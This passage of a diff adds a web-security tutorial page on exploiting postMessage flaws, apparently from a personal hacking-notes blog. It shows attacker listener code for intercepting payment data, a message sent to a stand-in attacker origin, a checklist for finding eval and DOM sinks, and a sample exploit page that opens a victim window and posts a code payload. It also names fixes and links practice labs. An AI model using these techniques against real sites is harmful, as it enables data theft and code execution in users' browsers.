+      <p><strong>Step 3: The Target Site Processes the Message</strong><br>The target site receives the message and processes it:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">"Payment data received:"</span>, <span class="c-blu">event</span>.<span class="c-blu">data</span>); <span class="c-dim">// Logs the fake payment data</span>
+});</code></pre>
+      <p>The payment data ({ cardNumber: "1234-5678-9012-3456" }) is logged to the console.</p>
+      <p><strong>Step 4: The Attacker Intercepts Sensitive Data</strong><br>The attacker's malicious site listens for messages from the target site:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-yel">if</span> (<span class="c-blu">event</span>.<span class="c-blu">origin</span> === <span class="c-grn">"https://vulnerable-site.com"</span>) {
+        <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">"Intercepted payment data:"</span>, <span class="c-blu">event</span>.<span class="c-blu">data</span>); <span class="c-dim">// Logs the stolen data</span>
+    }
+});</code></pre>
+      <p>If the target site sends sensitive data back to the attacker's site, the attacker can intercept it.</p>
+
+      <h3 id="how-to-fix">How to Fix the Vulnerabilities</h3>
+      <p><strong>Step 1: Validate the Origin.</strong><br>Update the target site's code to validate the origin of incoming messages.</p>
+      <p><strong>Step 2: Avoid Using Wildcards.</strong> Always specify the exact targetOrigin when sending messages.</p>
+
+      <h2 id="methodology">Methodology</h2>
+      <ol><li><strong>Detecting postMessage Usage</strong><br>Use tools like postMessage-tracker or Burp Suite DOM Invader as you browse the target application. These loggers will capture any calls to postMessage(…), showing you when and how the app is sending messages between windows or iframes.</li>
+      <li><strong>Examining the targetOrigin Parameter</strong><br>Whenever you see code like:</li></ol>
+      <pre><button class="copy-btn">Copy</button><code>otherWindow.<span class="c-blu">postMessage</span>(message, targetOrigin);</code></pre>
+      <p>focus on the targetOrigin value. There are two risky cases:</p>
+      <p><strong>Wildcard ("*"):</strong></p>
+      <pre><button class="copy-btn">Copy</button><code>otherWindow.<span class="c-blu">postMessage</span>(someData, <span class="c-grn">"*"</span>);  <span class="c-dim">// Any site can receive this message.</span></code></pre>
+      <p>With "*", the browser doesn't check where the message is going. That means any page, yours included, could intercept it.</p>
+      <p><strong>An Origin You Control:</strong></p>
+      <pre><button class="copy-btn">Copy</button><code>otherWindow.<span class="c-blu">postMessage</span>(someData, <span class="c-grn">"https://attacker.example.com"</span>);</code></pre>
+      <p>If targetOrigin matches sets an origin incorrectly, (like trusting any domain that contains "example.com" you could simply make a domain with subdomains like "example.com.evilsite.com" and that would bypass their flawed targetOrigin checks. Basically, if it sends data to any domain you own, and the target page is sending the message to a window that you actually control, you'll receive and read that data.</p>
+      <p>Here's are other ways on how you might end up "controlling" the target window:</p>
+      <p><strong>window.opener scenario:</strong><br>If the target page was opened from your site (e.g., via window.open("https://victim.com")), then victimWindow.opener points back to you. Whenever victimWindow does postMessage(…, "https://your-site.com"), you'll get the message in your original window.</p>
+      <p><strong>Iframe hijack scenario:</strong><br>If the target page embeds an iframe (e.g. &lt;iframe src="https://victim.com/inner"&gt;&lt;/iframe&gt;) and that page can be framed (no X-Frame-Options or strict CSP), you could:</p>
+      <ul><li>Load the target page on your own domain.</li><li>Replace or override the iframe's src to point to your page, but keep the same iframe reference name.</li><li>When the target page tries to send to that iframe, it's actually messaging your page, so you intercept the data.</li></ul>
+
+      <ol start="3"><li><strong>Verifying Message Listener Origin Checks</strong><br>Search for code that listens for incoming messages, such as:</li></ol>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">e</span>) {
+    <span class="c-dim">// handler logic…</span>
+});</code></pre>
+      <p>or</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">document</span>.<span class="c-blu">onmessage</span> = <span class="c-yel">function</span>(<span class="c-blu">e</span>) {
+    <span class="c-dim">// handler logic…</span>
+};</code></pre>
+      <p>Inside the handler, check whether the script does something like:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-yel">if</span> (<span class="c-blu">e</span>.<span class="c-blu">origin</span> !== <span class="c-grn">"https://expected-domain.com"</span>) {
+    <span class="c-yel">return</span>; <span class="c-dim">// drop the message</span>
+}</code></pre>
+      <p>A robust check should compare e.origin against a hardcoded expected origin (e.g., "https://trusted.com") or against window.location.origin.<br>Do not trust window.origin, because an attacker can send a message with an origin of "null" (e.g., from a sandboxed iframe), and some naive checks will accept it.</p>
+      <p>If the code uses anything less strict like simply seeing if e.origin "exists" or matches a non-specific pattern, it's vulnerable.</p>
+
+      <ol start="4"><li><strong>Finding Dangerous "Sinks" for e.data</strong><br>Once you identify a listener with weak or missing origin checks, test by sending messages from your own origin. Open the browser console on your attacker-controlled page and do:</li></ol>
+      <pre><button class="copy-btn">Copy</button><code>victimWindow.<span class="c-blu">postMessage</span>({ foo: <span class="c-grn">"bar"</span> }, <span class="c-grn">"https://victim.com"</span>);</code></pre>
+      <p>Then use breakpoints or console.log inside the victim's message handler to see what happens to e.data. Specifically look for code that does things like:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">eval</span>(<span class="c-blu">e</span>.<span class="c-blu">data</span>);
+
+<span class="c-blu">window</span>.<span class="c-blu">location</span> = <span class="c-grn">"javascript:"</span> + <span class="c-blu">e</span>.<span class="c-blu">data</span>;</code></pre>
+      <p>Inserting e.data directly into innerHTML or similar DOM APIs without sanitization.</p>
+      <p>Keep in mind that postMessage can only send data types allowed by the Structured Clone Algorithm. You can't send a function, but you can send strings, objects, arrays, Dates, even Blobs—so you have plenty of flexibility to craft a payload.</p>
+
+      <ol start="5"><li><strong>Building an Exploit</strong><br>As soon as you find a handler that:</li></ol>
+      <ul><li>Doesn't correctly check e.origin, and</li><li>Passes e.data into a dangerous sink (like eval),</li></ul>
+      <p>you can create a simple attacker-controlled HTML page—hosted on a different origin—to exploit it. Your exploit might look like:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;html&gt;</span>
+  <span class="c-dim">&lt;body&gt;</span>
+    <span class="c-dim">&lt;button id="openTarget"&gt;</span>Open Victim<span class="c-dim">&lt;/button&gt;</span>
+    <span class="c-dim">&lt;script&gt;</span>
+      <span class="c-blu">document</span>
+        .<span class="c-blu">getElementById</span>(<span class="c-grn">"openTarget"</span>)
+        .<span class="c-blu">addEventListener</span>(<span class="c-grn">"click"</span>, <span class="c-yel">function</span>() {
+          <span class="c-dim">// Open the victim page in a new window</span>
+          <span class="c-yel">const</span> victimWin = <span class="c-blu">window</span>.<span class="c-blu">open</span>(<span class="c-grn">"https://victim.com"</span>);
+          
+          <span class="c-dim">// Wait briefly (or listen for load) before sending</span>
+          <span class="c-blu">setTimeout</span>(() => {
+            victimWin.<span class="c-blu">postMessage</span>(<span class="c-grn">"maliciousCode()"</span>, <span class="c-grn">"https://victim.com"</span>);
+          }, <span class="c-red">500</span>);
+        });
+    <span class="c-dim">&lt;/script&gt;</span>
+  <span class="c-dim">&lt;/body&gt;</span>
+<span class="c-dim">&lt;/html&gt;</span></code></pre>
+      <p><strong>Iframing (if allowed):</strong><br>If the victim page can be framed, you could embed it inside your page directly and post messages to it without needing a user click. However, note that cookies or authentication tokens may not travel through an iframe in all configurations (e.g., if SameSite or cookie flags block them).</p>
+      <p><strong>Popup approach:</strong><br>Using window.open after a button click ensures the browser lets you send messages to the new window. Once you hold a reference to victimWin, call victimWin.postMessage(…) with your crafted payload.</p>
+
+      <h3 id="putting-it-all-together">Putting It All Together</h3>
+      <ol><li>Find any postMessage calls (logger tools will list them).</li><li>Check their targetOrigin—flag "*" or any domain you control.</li><li>Inspect message listeners on the victim site: do they properly compare e.origin to a single trusted origin?</li><li>Trace the code path of e.data in the handler—look for eval, location =, or unsafe DOM insertion.</li><li>Exploit by hosting a malicious page on another origin, opening or framing the victim, then sending a crafted message to run arbitrary code.</li></ol>
+      <p>With these steps, you'll methodically uncover and exploit any flawed postMessage implementation.</p>
+
+      <h2 id="practice-time">PRACTICE TIME</h2>
+      <p><strong>Portswigger Labs:</strong><br><a href="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source" target="_blank">https://portswigger.net/web-security/dom-based/controlling-the-web-message-source</a><br>Sinks located inside a PostMessage handler missing a proper origin check, can you test for it?</p>
+      <p><a href="https://public-firing-range.appspot.com/dom/index.html" target="_blank">https://public-firing-range.appspot.com/dom/index.html</a> (postMessage section)</p>
+      <p><em>Will be adding more later.</em></p>
+
+      <h2 id="resources">RESOURCES</h2>
+      <ul><li><a href="https://x.com/Rhynorater/status/1683821173677727747" target="_blank">https://x.com/Rhynorater/status/1683821173677727747</a> + <a href="https://rhynorater.github.io/postMessage-Braindump" target="_blank">https://rhynorater.github.io/postMessage-Braindump</a></li><li><a href="https://book.jorianwoltjer.com/languages/javascript/postmessage-exploitation" target="_blank">https://book.jorianwoltjer.com/languages/javascript/postmessage-exploitation</a></li><li><a href="https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html" target="_blank">https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html</a></li><li><a href="https://drive.google.com/file/d/1yjeVzEQJt03s_zHFM9OQJyhIQsTmyrsA/view" target="_blank">https://drive.google.com/file/d/1yjeVzEQJt03s_zHFM9OQJyhIQsTmyrsA/view</a></li></ul>
+      <p><em>Will be adding more later.</em></p>
+
+      <h2 id="video-resources">VIDEO RESOURCES</h2>
+      <ul><li><a href="https://www.youtube.com/watch?v=FTeE3OrTNoA" target="_blank">https://www.youtube.com/watch?v=FTeE3OrTNoA</a></li></ul>
+      <p><em>Will be adding more later.</em></p>
+
+      <div class="callout" style="margin-top: 3rem;">
+        <strong>Disclaimer</strong><br>
+        This started as personal notes from my web hacking journey. I cleaned them up in case they help others too.<br><br>
+        If you're learning too and want to connect:<br>
+        🐦 <a href="https://x.com/Symibot" target="_blank" style="color:var(--red);">@Symibot on X/Twitter</a><br>
+        💬 Discord: <code>symibot</code>
+      </div>
+    </article>
+
+    <nav class="article-nav">
+      <a href="#" class="nav-prev">← Previous Article</a>
+      <a href="#" class="back-btn">↑ All Articles</a>
+      <a href="#" class="nav-next">Next Article →</a>
+    </nav>
+  </main>
+
+  <aside class="article-aside">
+    <div class="toc-box">
+      <div class="toc-label">On this page</div>
+      <ul class="toc-list" id="toc-list"></ul>
+    </div>
+  </aside>
+</div>
+
+<footer>
+  <div style="max-width:1100px;margin:0 auto;padding:0 24px">
+    <p class="footer-heading">Let's connect</p>
+    <div class="footer-links">
+      <a href="https://x.com/Symibot" target="_blank" class="footer-link twitter">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        @symibot_
+      </a>
+      <a href="mailto:hello@symibot.dev" class="footer-link email">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4C2.9 4 2 4.9 2 6v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        hello@symibot.dev
+      </a>
+    </div>
+  </div>
+</footer>
+
+<script>
+  const hamburger = document.getElementById('hamburger');
+  const nav = document.getElementById('main-nav');
+  if (hamburger) hamburger.addEventListener('click', () => nav.classList.toggle('open'));
+  nav.querySelectorAll('a').forEach(a => a.addEventListener('click', () => nav.classList.remove('open')));
+
+  const tocList = document.getElementById('toc-list');
+  const headings = document.querySelectorAll('.article-body h2, .article-body h3');
+  headings.forEach(h => {
+    if (!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+    const li = document.createElement('li');
+    li.className = h.tagName === 'H3' ? 'toc-h3' : '';
+    const a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    tocList.appendChild(li);
+  });
+
+  const tocLinks = tocList.querySelectorAll('a');
+  function updateTOC() {
+    let current = '';
+    headings.forEach(h => { if (window.scrollY >= h.offsetTop - 100) current = h.id; });
+    tocLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + current));
+  }
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const code = btn.closest('pre').querySelector('code');
+      const text = code.innerText.trim();
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+      });
+    });
+  });
+</script>
+
+</body>
+</html>
